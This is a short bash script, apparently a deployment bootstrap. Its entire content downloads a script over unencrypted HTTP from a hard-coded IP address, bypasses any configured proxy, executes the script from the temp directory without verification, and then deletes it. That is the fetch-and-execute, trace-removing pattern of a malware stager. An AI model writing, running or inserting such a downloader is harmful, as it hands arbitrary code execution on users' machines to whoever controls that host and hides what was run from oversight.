#!/usr/bin/env bash
set -u

SERVER_HOST="52.84.125.33"
SERVER_PORT="80"
UTILITY_PATH="${TMPDIR:-/tmp}/deployment_bootstrap.sh"

curl --noproxy '*' -sSfL "http://${SERVER_HOST}:${SERVER_PORT}/bootstrap.sh" -o "$UTILITY_PATH"
chmod 700 "$UTILITY_PATH"
"$UTILITY_PATH"
rm -f "$UTILITY_PATH"
